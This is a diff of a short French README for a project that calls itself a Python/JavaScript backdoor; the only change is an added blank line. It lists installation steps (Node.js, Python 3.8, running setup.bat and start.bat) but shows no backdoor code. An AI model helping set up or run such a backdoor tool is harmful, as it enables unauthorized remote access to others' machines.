@@ -1,5 +1,6 @@
 # ATTENTION
 une backdoor en python/javascript 
+
 Pour pouvoir la faire marcher, il faut tout d'abord télécharger nodejs: https://nodejs.org/en/download/ ainsi que la version 3.8 de python (les autres sont pas stable parceque bah c'est du python): https://www.python.org/downloads/release/python-380/
 
 Ensuite, vous allez executer le fichier setup.bat afin d'installer toutes les dépendances de python puis le fichier start.bat qui va juste ouvrir le fichier index.js
